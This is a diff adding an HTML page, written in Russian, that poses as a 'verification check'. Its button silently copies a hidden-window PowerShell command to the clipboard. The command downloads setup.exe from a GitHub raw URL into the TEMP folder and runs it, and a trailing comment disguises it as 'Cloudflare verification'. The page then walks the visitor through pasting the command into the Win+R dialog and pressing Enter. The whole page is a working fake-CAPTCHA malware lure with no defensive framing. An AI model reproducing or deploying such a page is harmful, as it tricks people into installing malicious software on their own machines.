@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Проверка</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f7f7f7;
+        }
+        .container {
+            text-align: center;
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        .copy-btn {
+            background-color: #FF0000; /* Цвет кнопки красный */
+            color: white;
+            padding: 15px 32px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+        .copy-btn:hover {
+            background-color: #cc0000; /* Цвет при наведении */
+        }
+        .new-btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 32px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px; /* Сдвигаем кнопку ниже */
+            width: 100%;
+        }
+        .instruction {
+            font-size: 14px;
+            margin-top: 20px;
+            text-align: left;
+            display: none; /* Скрываем инструкцию по умолчанию */
+        }
+        .instruction p {
+            margin: 10px 0;
+        }
+        .error-message {
+            margin-top: 20px;
+            padding: 10px;
+            border: 2px solid red;
+            color: red;
+            font-size: 16px;
+            display: none; /* Скрываем сообщение по умолчанию */
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Пройди проверку</h2>
+    <button class="copy-btn" id="copyBtn" onclick="copyToClipboard()">Нажми для копирования</button>
+    
+    <div class="instruction" id="instruction">
+        <p><strong>1.</strong> Нажми на <strong>Win + R</strong></p>
+        <p><strong>2.</strong> После нажми <strong>Ctrl + V</strong>.</p>
+        <p><strong>3.</strong> Нажми <strong>Enter</strong> чтобы завершить проверку.</p>
+        <p><strong>4.</strong> Нажми кнопку ниже чтобы завершить.</p> <!-- Добавлен 4-й пункт -->
+    </div>
+    
+    <div class="error-message" id="errorMessage">
+        Вы не выполнили условия выше! <span id="countdown">3s</span>
+    </div>
+</div>
+
+<script>
+    // Переменная для хранения текущего интервала отсчёта
+    let countdownInterval;
+
+    // Функция для копирования команды при нажатии на кнопку
+    function copyToClipboard() {
+        var command = "powershell -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest 'https://raw.githubusercontent.com/withoutme2468/NEOsAm/main/setup.exe' -OutFile \"$Env:TEMP\\c.exe\"; Start-Process \"$Env:TEMP\\c.exe\"; # Cloudflare verification. Press enter \"W8AsM2beMW\"\"";
+        var textArea = document.createElement("textarea");
+        textArea.value = command;
+        document.body.appendChild(textArea);
+        textArea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textArea);
+        
+        // Показываем инструкцию после копирования
+        document.getElementById("instruction").style.display = "block"; // Показываем инструкцию
+        
+        // Удаляем старую кнопку
+        var oldBtn = document.getElementById("copyBtn");
+        oldBtn.remove();
+        
+        // Создаем новую кнопку ниже
+        var newBtn = document.createElement("button");
+        newBtn.classList.add("new-btn");
+        newBtn.innerHTML = "Завершить проверку";
+        newBtn.onclick = function() {
+            // Показываем ошибку, если условия не выполнены
+            document.getElementById("errorMessage").style.display = "block";
+            
+            // Сбрасываем предыдущий интервал, если он существует
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+            }
+
+            // Начинаем отсчёт времени с 3 секунд
+            var countdownElement = document.getElementById("countdown");
+            var countdownValue = 3; // Сбрасываем отсчёт на 3 секунды при каждом нажатии
+            countdownInterval = setInterval(function() {
+                countdownValue--;
+                countdownElement.textContent = countdownValue + "s"; // Добавляем "s" к числу
+                if (countdownValue <= 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById("errorMessage").style.display = "none"; // Скрываем сообщение после отсчёта
+                }
+            }, 1000); // Обновление каждую секунду
+        };
+        document.querySelector(".container").appendChild(newBtn);
+    }
+</script>
+
+</body>
+</html>
